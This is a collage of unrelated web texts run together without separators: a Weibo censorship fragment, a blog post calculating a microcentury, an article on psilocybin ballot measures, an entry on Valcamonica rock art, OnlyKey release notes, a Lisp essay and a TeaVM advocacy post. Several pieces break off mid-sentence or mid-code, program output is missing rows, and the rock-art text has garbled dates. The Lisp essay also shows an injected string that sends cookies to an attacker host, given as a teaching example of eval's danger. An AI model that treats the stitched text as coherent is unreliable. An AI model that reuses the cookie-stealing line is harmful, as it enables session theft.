<p>Living overseas, Wu is protected from the worst of the consequences of zhahao. For those based in China, or with family in the country, the stakes are much higher than just losing their accounts. One of Wu’s friends was summoned to a police station after posting an image of the cartoon character Winnie the Pooh, which is commonly used to mock Xi Jinping due to a perceived likeness between the two.</p>



<p>Some censored Weibo users have switched platforms. Chow and Yang have both moved onto Twitter, but there, their impact and audience are smaller. Around 10,000 of Chow’s followers have come with him to the U.S. platform, which is blocked in China. He says that he’s not given …</p></div></div>

<p>
I recently found this interesting paragraph from an article titled <a href="https://www.ams.org/notices/199701/comm-rota.pdf">Ten Lessons I
Wish I Had Been Taught</a> that is based on a talk presented by
Gian-Carlo Rota in Apr 1996:
</p>

<blockquote>
Running overtime is the one unforgivable error a lecturer can make.
After fifty minutes (one microcentury as von Neumann used to say)
everybody's attention will turn elsewhere even if we are trying to prove
the Riemann hypothesis. One minute overtime can destroy the best of
lectures.
</blockquote>

That's fine advice. In fact, the whole article is full of good advice
like this. Although it was written primarily for mathematicians, a lot
of what is said in the article applies quite well to professionals in
other fields too.

<p>
The excerpt I have quoted above got me thinking about exactly how long a
microcentury is. It couldn't be exactly 50 minutes, could it?
</p>


<h2 id="wiktionary-on-microcentury"><a href="#wiktionary-on-microcentury">Wiktionary on Microcentury</a></h2>
<p>
The English Wiktionary entry for <a href="https://en.wiktionary.org/wiki/microcentury">microcentury</a>
(as of <a href="https://en.wiktionary.org/w/index.php?title=microcentury&amp;oldid=59316064">revision
59316064</a> on 7 May 2020) mentions:
</p>

<blockquote>
A time period of a millionth of a century, equal to 52 minutes and 34 seconds.
</blockquote>

<blockquote>
Not a standard unit of measurement, and used mostly humorously to denote
the maximum length of a lecture.
</blockquote>

<p>
This looks incorrect to me. This is based on the oversimplified
assumption that a century contains 36500 days, that is, it assumes that
a century is a span of 100 years where each year has exactly 365 days.
If a century were to have exactly 36500 days, then indeed it would have
3 153 600 000 seconds and one millionth of it would be
3153.6 seconds which is equivalent to 52 minutes 33.6 seconds. This
looks consistent with the Wiktionary entry. However, an actual century
on the calendar does not have exactly 36500 days. Some years are leap
years, so the actual number of days in a century is more than that.
</p>


<h2 id="assumptions"><a href="#assumptions">Assumptions</a></h2>
<p>
Let us find out how long a microcentury is as accurately as possible. We
will count the leap years. We will ignore leap seconds because they are
irregularly spaced and unpredictable. We will also ignore the following
gap between 2 Sep 1752 and 14 Sep 1752 when the British Empire switched
from the Julian calendar to the Gregorian calendar:
</p><pre><samp>$ <kbd>cal 9 1752</kbd>
   September 1752
Su Mo Tu We Th Fr Sa
       1  2 14 15 16
17 18 19 20 21 22 23
24 25 26 27 28 29 30</samp>
</pre>

<p>
The above output can be obtained by running the <code>cal</code> command
as shown above on a Unix or Linux system. Ignoring this gap is
equivalent to assuming that we are working with the Gregorian calender
since the year 1 AD.
</p>

<p>
We will call a year that is a multiple of 100 to be a <em>centurial
year</em>. Further, we will not debate whether a centurial year begins a
new century or ends one, that is, we don't care whether the current
century runs from 2001 to 2100 or if it runs from 2000 to 2099. The
computation presented in the next section works equally well for any
span of 100 years.
</p>


<h2 id="computation"><a href="#computation">Computation</a></h2>
<p>
Any span of 100 years contains exactly one centurial year, that is, a
year that is a multiple of 100. A centurial year is a leap year <em>if
and only if</em> it is also a multiple of 400. Apart from the centurial
year, a century contains 24 occurrences of years that are multiples of 4
and these are all leap years. From these facts, we can conclude that a
span of 100 years contains:
</p>

<ul>
  <li>
    Exactly 25 leap years if the centurial year within the span is a
    multiple of 400.
  </li>
  <li>
    Exactly 24 leap years, otherwise.
  </li>
</ul>

<p>
Therefore a century has either 36524 days or 36525 days. In other words,
a century has either 3 155 673 600 seconds or
3 155 760 000 seconds. Here is a
quick demonstration of this with a simple Python program:
</p>

<pre><code>#!/usr/bin/env python3

import datetime

for year in range(1, 2400, 100):
    delta = datetime.date(year + 100, 1, 1) - datetime.date(year, 1, 1)
    print('{:04}-{:04}: {} d = {} s'
          .format(year, year + 100, delta.days, delta.total_seconds()))</code>
</pre>

<p>
Here is the output of this program:
</p>

<pre><samp>0001-0101: 36524 d = 3155673600.0 s
0101-0201: 36524 d = 3155673600.0 s

1101-1201: 36525 d = 3155760000.0 s
1201-1301: 36524 d = 3155673600.0 s
1301-1401: 36524 d = 3155673600.0 s
1401-1501: 36524 d = 3155673600.0 s
1501-1601: 36525 d = 3155760000.0 s
1601-1701: 36524 d = 3155673600.0 s
1701-1801: 36524 d = 3155673600.0 s
1801-1901: 36524 d = 3155673600.0 s
1901-2001: 36525 d = 3155760000.0 s
2001-2101: 36524 d = 3155673600.0 s
2101-2201: 36524 d = 3155673600.0 s
2201-2301: 36524 d = 3155673600.0 s
2301-2401: 36525 d = 3155760000.0 s</samp>
</pre>

<p>
Thus one millionth of a century has 3155.6736 or 3155.7600 seconds, that
is 52 minutes 35.6736 seconds or 52 minutes 35.7600 seconds.
</p>


<h2 id="Conclusion"><a href="#conclusion">Conclusion</a></h2>

<p>
If we round off the number of seconds in a microcentury to one decimal
place, we can say that a microcentury has 52 minutes 35.7 seconds.

<p>When Melissa Lavasani began suffering from postpartum depression after the birth of her second child, she tried a variety of treatments: talk therapy, cupping, and acupuncture. “Things were spiraling,” she said. Worried that pharmaceutical antidepressants would create a long-term dependency, she learned of a new treatment option when she listened to a podcast featuring <a href="https://www.discovermagazine.com/environment/how-mushrooms-can-save-the-world" target="_blank">Paul Stamets</a>, a mycologist (fungi expert) and evangelist for the healing potential of psilocybin, the main component of magic mushrooms.&nbsp;</p><p>When Lavasani tried microdosing psilocybin to treat her depression, she immediately felt better. “But it was nerve wracking,” she said. “I was well aware I was in possession of a Schedule 1 drug. I knew I was breaking the law. I was fearful I would lose my job, lose my children.”</p><p>Now Lavasani has also become an evangelist for using psilocybin for therapeutic purposes, organizing a Nov. 3 <a href="https://ballotpedia.org/Washington,_D.C.,_Initiative_81,_Entheogenic_Plants_and_Fungus_Measure_(2020)" target="_blank">ballot initiative</a> that asks Washington, D.C. voters to effectively decriminalize plant-based medicines. The initiative asks D.C. police to place home growing, possession, and gifting of psychedelic plants and fungi among its lowest law enforcement priorities and requests that the D.C. attorney general stop prosecuting these cases.</p><p>D.C. voters aren’t the only ones considering a hallucinogenic fungi-related ballot initiative this year. On the other side of the country, Oregon residents will weigh in on two measures: <a href="https://ballotpedia.org/Oregon_Measure_110,_Drug_Decriminalization_and_Addiction_Treatment_Initiative_(2020)" target="_blank">one that would decriminalize</a> personal use of most common drugs, including magic mushrooms, and <a href="https://ballotpedia.org/Oregon_Measure_109,_Psilocybin_Mushroom_Services_Program_Initiative_(2020)" target="_blank">another that would create a program</a> for the supervised, therapeutic use of psilocybin in clinical settings. If the measures pass, these places would join the ranks of Oakland, Santa Cruz, Denver, and Ann Arbor—all cities that have taken steps to decriminalize magic mushrooms in the past year.&nbsp;&nbsp;</p><p>Many of these places were also the forerunners in the marijuana decriminalization and legalization movement. Oregon was the first state to decriminalize cannabis in 1973, while Colorado, along with Washington state, was the first to legalize recreational cannabis in 2012.&nbsp; Cities like Oakland and Denver were among the first to establish functioning legal markets for the drug. The movement grew to <a href="https://www.ncsl.org/research/health/state-medical-marijuana-laws.aspx" target="_blank">other places</a>, driven largely by ballot measures, with recreational pot sales allowed in 11 states and medical use of marijuana permitted in 32 states and the District of Columbia.</p><p>The gradual acceptance of marijuana set the stage for other drugs like mushrooms, said Heather Trela, a researcher who <a href="https://rockinst.org/blog/has-marijuana-provided-a-blueprint-for-magic-mushrooms/" target="_blank">studies cannabis policy</a> at the Rockefeller Institute of Government at the State University of New York.&nbsp;</p><p>“Marijuana broke the glass ceiling,” she explained. “Legalizing that drug wasn’t the catastrophe some people were expecting. Mushroom campaigns will certainly benefit from that pathway being cleared already.”</p><p>But the measures aren’t without critics. In Oregon, for example, medical organizations have warned about the dangers of moving ahead with offering patients treatments that aren’t fully vetted by the federal government.</p><p>U.S. Rep. Andy Harris, a Maryland Republican who is one of the <a href="https://www.washingtonpost.com/local/md-politics/maryland-rep-andy-harris-has-become-public-enemy-no-1-for-marijuana-activists-how-did-it-get-so-personal/2019/04/15/93ac9c32-5fc4-11e9-bfad-36a7eb36cb60_story.html" target="_blank">most vocal opponents</a> of D.C.’s attempt to legalize marijuana, urged city voters not to take the same attitude towards psychedelics that they did towards pot. “This is a bald-faced attempt to just make these very serious, very potent, very dangerous—both short-term and long-term—hallucinogenic drugs broadly available,” Harris said in an interview with the <a href="https://nypost.com/2020/07/08/congressman-vows-vote-to-stop-dc-from-allowing-psychedelics/" target="_blank"><em>New York Post</em></a><em>.</em></p><p>Some of the factors that helped marijuana gain legal status through ballot initiatives in states across the country won’t be as helpful for mushrooms. For starters, marijuana is the most popular recreational drug on the market, with close to <a href="https://www.washingtonpost.com/news/wonk/wp/2017/04/19/11-charts-that-show-marijuana-has-truly-gone-mainstream/" target="_blank">35 million people</a> defined as regular users who consume at least once a month—meaning there’s a lot of potential voters who’d like to see it legalized. The data on regular psychedelic drug users isn’t as reliable; the best estimates come from <a href="https://www.samhsa.gov/data/data-we-collect/nsduh-national-survey-drug-use-and-health" target="_blank">an annual survey</a> of around 67,500 people conducted by the Substance Abuse and Mental Health Services Administration, which has found an average of 0.1% of respondents to be current psychedelic users—scaled up to the U.S. population, that’s less than 350,000 people.&nbsp;</p><p>Because the potential user base is so small—and it seems unlikely to substantially increase due solely to decriminalization—ballot initiative organizers can’t make financial arguments about tax revenue, a <a href="https://www.westword.com/marijuana/colorado-crosses-1-billion-in-marijuana-tax-revenue-11374499" target="_blank">major selling point</a> for recreational marijuana. They also can’t make as clear an argument that psychedelic legalization is a knock against the War on Drugs, another common refrain in the pot legalization movement. (Although some researchers <a href="https://www.nytimes.com/2019/05/08/us/denver-magic-mushrooms-decriminalization.html" target="_blank">have argued</a> that labeling some drugs as “good” and other drugs as “bad” inherently perpetuates the drug war.)</p><p>In places like Denver, where voters decriminalized mushrooms in 2019, <a href="https://www.nytimes.com/2019/05/08/us/denver-magic-mushrooms-decriminalization.html" target="_blank">only 11 cases</a> for mushroom possession were prosecuted in the three years leading up to the ballot initiative, and numbers are similarly low in other places. “Mushrooms have never been a huge priority for law enforcement,” Trela said. “The data doesn’t exist to show disproportionate arrests of people of color in this case <a href="https://norml.org/marijuana/fact-sheets/racial-disparity-in-marijuana-arrests/" target="_blank">as it does for marijuana</a>.”</p><p>Sam Chapman, the campaign manager for <a href="https://voteyeson109.org/measure-109/" target="_blank">Yes on 109</a>, one of the ballot initiatives in Oregon, said that “cannabis is not psilocybin from a historical or political context” but that “cannabis legalization helped show the general public how big a failure the War on Drugs has been.” The biggest lesson mushroom campaigns can take from marijuana legalization, he said, is ensuring that people of color have equitable access to therapy and licensing if it becomes available—a stumbling point of some marijuana legalization efforts where critics have noted that the people who have <a href="https://www.usatoday.com/story/news/nation/2019/12/21/chicago-recreational-marijuana-dispensary-owners-diversity/4366180002/" target="_blank">reaped the benefits</a> of the new market have been largely white and male.</p><p>But organizers say they aren’t worried that they lack the financial and social justice arguments of the cannabis movement—because the chief benefit is the drug’s medical uses. “There’s a lot of scientific education that needs to be done for these campaigns, more so than with cannabis,” said Lavasani in D.C. “This isn’t a recreational party drug. It’s a therapy for people when no other solution works.”</p><figure><img alt="" height="900" src="https://www.route-fifty.com/media/ckeditor-uploads/2020/10/23/Image%20from%20iOS%20(1).jpg" width="1200">

Research into psilocybin has been severely stymied since the 1960s, but institutions like Johns Hopkins, Stanford, and the University of California in Los Angeles have made significant strides in recent years showing the potential uses of psilocybin in treating <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6007659/" target="_blank">depression</a> and anxiety, <a href="https://journals.sagepub.com/doi/full/10.1177/2470547020939564" target="_blank">PTSD</a> among veterans, and <a href="https://clinicaltrials.gov/ct2/show/NCT04052568" target="_blank">eating disorders</a>.

<p>The rock drawings of Valcamonica are prehistoric petroglyphs carved in the glacier-polished, grey-purple Permian sandstone of the Camonica valley that extends for 90 km in the Italian provinces of Brescia and Bergamo in Lombardy. The name of the valley comes from “Cammunni”, the name its inhabitants carried during the <a href="https://www.ancient.eu/Iron_Age/">Iron Age</a>. Its artistic heritage, carved in 2500 rocks scattered along the entire valley, constitutes an extraordinary figurative testimony of the daily life and spirituality of ancient humans. The first appearance of these drawings can be dated back to the age of Epipaleolithic (20000-1000 BP) and the last to Medieval times (476-1453 CE) even if the best represented period is the Iron Age (1200 BCE - 200 CE). Between 200,000 and 300,000 incisions have been&nbsp;recognized and catalogued on the sandstone of the Camonica Valley. Most of these carvings represent animals and scenes of everyday life but also magic, <a href="https://www.ancient.eu/war/">war</a> and navigation. The uniqueness of this archaeological site is that the figures were realized during a time span of 8000 years and have resisted until today, almost undamaged. The Rock Drawings of Valcamonica were added to the UNESCO World Heritage in 1979 CE and were thus the first Italian site to be added to the list.</p><figure rel="12021" lang="en">

</figure><h3>History &amp; Discovery</h3><p>Different from every other European site of this kind, the carvings have always been part of the history of the population living in the Camonica Valley. However, before the 20th century CE, they were surrounded by indifference and they were called <em>pitoti&nbsp;</em>by the inhabitants of the valley. This name, in the local dialect, means 'scribbles', referring to the abstract and stylized drawings made by children. Only in the first years of the 20th century CE, precisely in 1914 CE, the alpinist and geographer Gualtiero Laeng signalled in the Touring Club Guide about the region, the presence of the two erratic boulders of Cemmo displaying some of the drawings of the valley. This helped to spread knowledge, contributing&nbsp;to an increase in&nbsp;interest in the prehistoric art of stone carvings of Valcamonica.</p><p>The Camunian rose, one of the most famous cravings of the valley, was chosen to become the symbol of the region of Lombardy itself.</p><p>In the 1020s CE, further studies were conducted, followed in the '30s by the politically-aimed research&nbsp;made by Franz Altheim and Erika Trautmann, commissioned by the then German Nazi officer, Heinrich Himmler. The purpose behind their studies was an&nbsp;attempt to&nbsp;identify&nbsp;in the carvings the north European origins of the <a href="https://www.ancient.eu/Aryan/">Aryan</a> race for it to be legitimized in the context of Hitler’s Third Reich. The same was done by Italian fascists&nbsp;who&nbsp;reclaimed the Italian origins of the carvings as a symbol of the industriousness that characterized the population of the territory before the <a href="https://www.ancient.eu/Roman/">Roman</a> period.</p><p>During the Second World War (1939-45 CE), the archaeological research&nbsp;was&nbsp;interrupted until 1959 CE. In this year, the first major step towards the site as it is known today was brought about by Laeng himself. He drew the first map of Naquane’s rock engravings and founded the first archaeological park in <a href="https://www.ancient.eu/italy/">Italy</a>. Of major importance to the site were the studies fostered by another important figure, Emmanuel Anati, an archaeologist whose&nbsp;meticulous and scientific method introduced the technique of the manual field surveying of the rocks. This method helped him to develop a stylistic classification of the Camunian representative art, being able in the following years to discover and classify thousands of rock carvings in the archaeological site.</p><figure rel="12022" lang="en">

</figure><p>During the 1970's CE, <em>pitoti</em>&nbsp;became a symbol of identity and heritage of the Camonica valley and in 1975 CE, the Camunian rose, one of the most famous cravings of the valley, was chosen to become the symbol of the region of Lombardy itself. The meaning of this<br>carving is unsure, but the presumed symbolism behind it is the sun with the four cardinal points indicating the solar trajectory in the sky during the day. This was interpreted by Anati as having&nbsp;a meaning of fortune and prosperity. In 1979 CE, during the third World Heritage Committee in Cairo, the Camonica Valley became the first Italian UNESCO site.</p><p>Oxen or elks, represented as the main characters of hunting scenes, are pierced &amp;&nbsp;killed by weapons.</p><p>The carvings were realized on Permian sandstone that was smoothed by the melting and sliding of glaciers. The main techniques used to realize the figures were two: the “martelline” and the “filiform” technique. The “marteline” consisted in tapping the rocky surface first with a stone tool and then a metallic one which creates small circular concavities. The other technique that was used in Camonica Valley is the “filiform” or “graffiti”: with this procedure, the representations are achieved by engraving the rocky surface with a pointed instrument used as a burin chisel. This instrument, rubbed several times on the rocks, would leave the <a href="https://www.ancient.eu/Mark/">mark</a> of a furrow.</p><p>The rock carvings of Valcamonica&nbsp;resulting from these two different techniques belong to four main stylistic groups. The first is the prehistoric period from the Epipaleolithic to the <a href="https://www.ancient.eu/Bronze_Age/">Bronze Age</a> where figures are isolated or grouped in a symbolic character. Following this, it is possible to witness some carvings from the proto-historic period during the Iron Age, where the artistic narrative is more naturalistic and characterized by movement and the description of actions. Finally, the carvings belonging to the last period can be associated with the Cammuni population, inhabiting the valley from&nbsp;Roman to&nbsp;medieval times.</p><figure rel="12020" lang="en">

</figure><h3>The Evolution of Cammunian Art</h3><p>The rock carvings belonging to the Prehistoric period are&nbsp;sometimes of considerable dimensions. These drawings depict figures of animals, among which oxen or elks, represented as the main characters of hunting scenes, pierced and killed by weapons. During the <a href="https://www.ancient.eu/Neolithic/">Neolithic</a> (10000-5000 BCE), the centre of the narrative characterizing the carvings of the Camonica Valley is shifted from animals to human beings. Characterizing this period were the symbolic representations of prayers in the orant position called “oranti”. These were stylized figures of human beings representing adoration, dance or lamentation. In this period the first representations of geometric figures were also found.</p><p>During the Chalcolithic (5000-4000 BCE), rock art is characterized by stelae and menhirs&nbsp;carved with symbolic and naturalistic figures. These rocks were placed in worship sites for ceremonies and rites or had a sepulchral function. These worship places were attended for thousands of years.</p><p>The <a href="https://www.ancient.eu/bronze/">Bronze</a> Age (3300-1200 BCE) was characterized by carvings representing ploughing scenes, looms and prayers while the Iron Age (1200 BCE - 200 CE) presents figures of warriors during hunting, duels and horseriding. These scenes represented the initiation rites faced by young aristocratic boys to become men. In these carvings, warriors are meticulously represented with a variety of weapons that were rediscovered by archaeological digs at&nbsp;the site of Val Camonica. In the representation of hunting scenes, the prayers are often deer, that were hunted by a man represented on a horse and helped by a dog. In addition, there are also drawings representing simple buildings, aquatic birds and footprints. Finally, with the Roman <a href="https://www.ancient.eu/conquest/">conquest</a> of the territory, the Cammunian Art saw its decline mainly due to the “fight” promoted by the believers of the Christian doctrine, during the 4th&nbsp;century CE, against the idolatry of carved stones, called in Latin <em>saxorum veneratio</em>. During the period of the Middle Ages (476-1453 CE), drawings of symbolic figures, towers, castles and churches represented the very last rock carvings of the Camonica Valley.</p><div><p><iframe data-src="https://www.youtube.com/embed/cxO5Jmbr2bc?autoplay=0" frameborder="0" allowfullscreen="" title="Rock Drawings in Valcamonica (UNESCO/NHK)"></iframe></p></div><h3>The Site Today</h3><p>The archaeological park was created in 1955 CE by the archaeological superintendence of Lombardy under the name of the National Park of Rock Engravings in Capo di Ponte (<em>Parco nazionale delle incisioni rupestri di Naquane</em>). Later, in 1964 CE, Emmanuel Anati founded the Cammunian Center of Prehistoric Studies. After the inclusion of the site in the UNESCO list, further research&nbsp;is still continuing today to broaden our&nbsp;knowledge of the site and unearthing new carvings and rocks. In the context of the archaeological site, eight&nbsp;different parks were realised, among which are the natural carving reserve of Ceto, Cimbergo and Paspardo, reaching an extension of 290 hectares distributed among 3 different municipalities. In addition, the most recent introduction in the park was in 2014 CE with the institution of the National Museum of Prehistory of the Camonica Valley (<em>Museo Nazionale di Preistoria della Valcamonica</em>). The importance and uniqueness of the archaeological discoveries within the site are&nbsp;a testimony to&nbsp;the great contribution that the Camonica Valley has brought to our&nbsp;knowledge of the history of the ancient humans.</p><p><em>This article was submitted as part of Ancient History Encyclopedia's UNESCO Summer School scholarship programme.</em></p> </article><p>

<p>For the past year, we have been busy making OnlyKey better, easier to use, and well-suited for remote workers. With our upcoming Fall release (to be released later in October) we will introduce some great new features such as:</p>
<h3><strong>OnlyKey GPG agent</strong></h3>
<p>This has been our #1 most requested feature, and it is finally here! For years, OnlyKey has supported an SSH agent, allowing secure passwordless SSH authentication. Now OnlyKey agent integrates with GPG to let users decrypt files, sign git commits, and even manage passwords (with pass and gopass). Instead of keeping GPG keys on a computer, OnlyKey generates and securely stores your keys off of the computer. We will also have the option to import your own existing PGP keys for more advanced users.</p>
<h3><strong>WebCrypt 3.0</strong></h3>
<p>We have greatly improved our webcrypt web application for OnlyKey on-the-go use. With our GPG agent we now have the ability to seamlessly use PGP anywhere, locally or in the browser (Chrome, Firefox, <a href="https://docs.crp.to/mobile.html">Android, and Safari on iPhone</a>). In the browser, WebCrypt now supports:</p>
<ul><li>Multiple-recipient encrypted messages and files.</li><li>Send to Keybase users and now also Protonmail users directly in the app. Just type their username or Protonmail email address.</li><li>User search has been improved to also include Protonmail. Find Keybase and Protonmail user’s by name or email.</li><li>Support for multiple PGP key types RSA or X25519 (used by Protonmail).</li><li>File and message share links. We have developed an innovative way to allow file sharing links using an open-source decentralized database called <a href="https://gun.eco/">GUN</a>. Share links utilize a double layer of encryption.</li><li>3rd-party developer API. We have developed an innovative way to permit 3rd-party developer use in external applications. OnlyKey generates an unlimited number of derived keys which are unique to a developer’s domain and may be used in web applications. We plan to release this on NPM soon.</li></ul>
<h3><strong>SysAdmin Mode</strong></h3>
<p>Another top-requested feature, enabling SysAdmin mode permits OnlyKey to type almost any combination of characters in addition to usernames and passwords. For example, wouldn’t it be nice to login to Windows with just a single button press? SysAdmin mode permits OnlyKey to enter Ctrl-Alt-Del, then enter usernames and passwords. Another example might be allowing OnlyKey to type Ctrl+Alt+T to open a terminal in Ubuntu to run a commonly used command. Of course, with this feature additional security is also required and a privileged access mode is required to configure these values.</p>
<h3><strong>Primary Profile and Secondary Profile LED Color</strong></h3>
<p>OnlyKey supports a primary and secondary profile, switching between the two is now even easier. Hold down button #3 for 5 seconds to lock OnlyKey and switch profiles. Recognizing which profile you are logged into is now easier with profile colors, OnlyKey has Green light for Primary profile and Blue light for Secondary profile.</p>
<h3><strong>Security Key (FIDO2 / FIDO U2F) Updates</strong></h3>
<p>Updates have been made for improved usability of the security key feature and to support the ability to manage FIDO2 resident keys.</p>
<h2><strong>What else is new?</strong></h2>
<p><strong>New OnlyKey Community Forum</strong> – We have launched our new OnlyKey Community Forum available here – <a href="https://onlykey.discourse.group/">https://onlykey.discourse.group</a>. This will replace the existing OnlyKey Support Forum.</p>
<p><strong>KeePassXC Support</strong> – OnlyKey is supported in KeePassXC. A recent update to KeePassXC allows using OnlyKey as a security key to protect your software password manager. If you are in the market for a free, open source, and cross-platform software password manager, check out <a href="https://keepassxc.org/docs/#faq-yubikey-howto">KeePassXC</a> and check out the <a href="https://docs.crp.to/usersguide.html#keepassxc">OnlyKey Users Guide</a> to get started.</p>
<p><strong>Improved OnlyKey SSH Support</strong> – OnlyKey SSH agent now supports both derived keys and stored keys for users who wish to use a single key to log into multiple servers. PGP (RSA and ECC) key import support will be added in our next OnlyKey SSH agent release. This allows users to import existing keys to OnlyKey for secure SSH. Alternatively, OpenSSH supports OnlyKey — read more about that <a href="https://docs.crp.to/openssh.html">here</a>.</p>
<p><span>We are in the final phases of testing a new, more portable USB-A &amp; USB-C OnlyKey hardware platform and expect to have some news about launch in late 2020 / early 2021. Stay tuned!</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p><span><p>Every lisp hacker I ever met, myself included, thought that all those brackets in Lisp were off-putting and weird. At first, of course. Soon after we all came to the same epiphany: <em>lisp’s power lies in those brackets</em>! In this essay, we’ll go on a journey to that epiphany.</p><p>Say we were creating a program that let you draw stuff. If we wrote this in JavaScript, we might have functions like this:</p><pre><code><span>drawPoint</span><span>({x: </span><span>0</span><span>, y: </span><span>1</span><span>}, </span><span>'yellow'</span><span>)</span>
<span>drawLine</span><span>({x: </span><span>0</span><span>, y: </span><span>0</span><span>}, {x: </span><span>1</span><span>, y: </span><span>1</span><span>}, </span><span>'blue'</span><span>)</span>
<span>drawCircle</span><span>(</span><span>point</span><span>, </span><span>radius</span><span>, </span><span>'red'</span><span>)</span>
<span>rotate</span><span>(</span><span>shape</span><span>, </span><span>90</span><span>)</span>
<span>...</span></code></pre><p>So far, so cool.</p><p>Now, here’s a challenge: <strong>Can we support remote drawing?</strong></p><p>This means that a user would be able to “send” instructions to your screen, and you would see their drawing come to life.</p><p>How could we do it?</p><p>Well, say we set up a websocket connection. We could receive instructions from the user like this: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>/* TODO */</span><span> </span>
<span>})</span></code></pre><p>To make it work off the bat, one option could be to take code strings as input:</p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> {</span>
<span>  </span><span>eval</span><span>(</span><span>data</span><span>)</span>
<span>})</span></code></pre><p>Now the user could send <code>"drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')"</code> and bam: we’ll draw a line! </p><p>But…your spidey sense may already be tingling. What if the user was malicious and managed to send us an instruction like this:</p><pre><code><span>"window.location='http://iwillp3wn.com?user_info=' + document.cookie"</span></code></pre><p>Uh oh…our cookie would get sent to iwillp3wn.com, and the malicious user would indeed pwn us. We can’t use eval; it’s too dangerous. </p><p>There lies our problem: we can’t use <code>eval</code>, but we need some way to receive arbitrary instructions.</p><p>Well, we could represent those instructions as JSON. We can map each JSON instruction to a special function, and that way we can control what runs. Here’s one way we can represent it:</p><pre><code><span>{</span>
<span>  instructions: [</span>
<span>    { functionName: </span><span>"drawLine"</span><span>, args: [{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>] },</span>
<span>  ];</span>
<span>}</span></code></pre><p>This JSON would translate to <code>drawLine({x: 0, y: 0}, {x: 1, y: 1},"blue")</code></p><p>We could support this pretty simply. Here’s how our <code>onMessage</code> could look:</p><pre><code><span>webSocket</span><span>.onMessage</span><span>(</span><span>instruction</span><span> </span><span>=&gt;</span><span> { </span>
<span>  </span><span>const</span><span> </span><span>fns</span><span> </span><span>=</span><span> {</span>
<span>    drawLine: </span><span>drawLine</span><span>,</span>

<span>})</span></code></pre><p>That seems like it would work!</p><p>Let’s see if we can clean this up. Here’s our JSON:</p><pre><code><span>{</span>
<span>  instructions: [</span>

<span>  ];</span>
<span>}</span></code></pre><p>Well, since <em>every</em> instruction has a <code>functionName</code>, and an <code>args</code>, we don’t really need to spell that out. We <em>could</em> write it like this: </p><pre><code><span>{</span>
<span>  instructions: [[</span><span>"drawLine"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>1</span><span>, y: </span><span>1</span><span> }, </span><span>"blue"</span><span>]],</span>
<span>}</span></code></pre><p>Nice! We changed our object in favor of an array. To handle that, all we need is a rule: <strong>the</strong> <strong><em>first</em></strong> <strong>part of our instruction is the function name, and the <em>rest</em> are arguments.</strong> If we wrote that down, here’s how our <code>onMessage</code> would look: </p><pre><code><span>websocket</span><span>.onMessage</span><span>(</span><span>data</span><span> </span><span>=&gt;</span><span> { </span>

Java is winning many battles these days with 6 month release cycles,
exciting new features, and more.  However, there is a bigger war
looming: the war for the browser.  This is a war Java can't afford to
lose.  Read on for a winning strategy and what you can do to help.

<h3>A Bit Of History</h3>

In the late 90's and 2000's, Java had a strong presence in the
browser.  Java Applets were Java UIs that ran directly on a web page
— think Canvas but with Java APIs for drawing and sound.  Java
Web Start let you launch full Java UIs from the browser.  Both of
these could communicate with services running on Java App Servers, for
a full-stack Java experience.  Indeed, the initial excitement over
client-side Java led people to try it out server-side, where it became
even more popular.  Remember this for later: client-side dominance has
a history of extending server-side.

<h3>Fast-Forward 20 Years...</h3>

Here in 2020, things have taken a turn for the worse.  All major
browsers have disabled support for Java (and indeed most
non-JavaScript technologies).  Web-based front-ends are
usually coded in JavaScript or some wrapper designed to make it less
problematic (like TypeScript).  

<p>

Yes, you can still make websites using Java technology.  There are
plenty of 'official' technologies like JSP and JSF.  Unfortunately,
these technologies are entirely server-side.  You can generate the
page using Java libraries and business logic, but once it is sent to
the browser it is static and lifeless.  User interaction requires one
of two ugly options:

</p><ul>
  <li> A round-trip back to the server (slow — a bad user experience)
  </li><li> JavaScript embedded in the middle of your otherwise pristine
  Java-generated page
</li></ul>

Some teams forgo Java altogether and build their front-ends entirely
in JavaScript.  Having made that decision, some go even further and
look at options for running JavaScript server-side too.  Sound
familiar?  This is how Java once took over the computing world.

<h3>Winning Many Battles</h3>

Java fortunately has not stood still.  The Java Enhancement Process
(JEP) has avoided bureaucratic quicksand and has produced numerous
improvements to Java through the years, most of them well ahead of
JavaScript.

<p>

Improvements are now coming every 6 months, thanks to the new
release cadence.  Already new garbage collectors, easier to use
strings, and improved threading are available either for production or
for evaluation.  However, when you think about which of these
innovations are for building browser-based apps, you quickly realize
that Java client-side innovation has all but stopped, at least via the
official channels.

</p><p>

As the famous saying goes, <strong>we don't want to win the battle but lose
the war</strong>.  How can Java increase its relevance?  How can Java win back
client-side developers?  How can Java prevent other technologies from
leveraging front-end dominance to win the back-end, like Java once did
to other technologies?

</p><h3>How To Win The War</h3>

To win the war, Java needs a strong client-side option.  One that lets
developers make modern web applications using Java code.  One that
leverages web technologies.  One that supports components.  One that
builds quickly.  One that produces fast-downloading, high performance,
100-Lighthouse-scoring apps.  One that plays nicely with other JVM
languages.  What does Java need?

<h3>What Java needs Is TeaVM</h3>

TeaVM is an ahead-of-time transpiler that compiles Java classes to
JavaScript.  It lets your Java code interact with Web APIs and the
DOM.  It also includes a rich framework for developing web
applications called Flavour.  Some of the many powerful features of
TeaVM and Flavour:

<ul>
  <li> Numerous Web APIs ready for use via type-safe Java wrappers.
  </li><li> A rich component framework to build apps from reusable components
  </li><li> Numerous pre-built components
  </li><li> Single-page app support with a shadow DOM and routing
  </li><li> Easy, transparent calls to web services
</li></ul>

If you are a Java developer who is building a browser-based user
interface, TeaVM is for you.  There are two main styles of TeaVM apps:

<ul>
  <li> Graphical apps that draw their entire UI on a Canvas and have
  very little HTML or CSS.  These apps may just need TeaVM.
  </li><li> Single-page web apps that use HTML and CSS.  These apps benefit
  from using the Flavour framework on top of TeaVM to handle routing,
  invoking REST services, and JSON parsing.
</li></ul>

However, it doesn't have to be all or nothing, there are hybrid
possibilities like the following:

<ul>
  <li> A primarily Canvas-based app that uses Flavour to occasionally
  show other HTML pages.
  </li><li> A primarily HTML-based app that includes a Canvas on certain
  pages.
</li></ul>

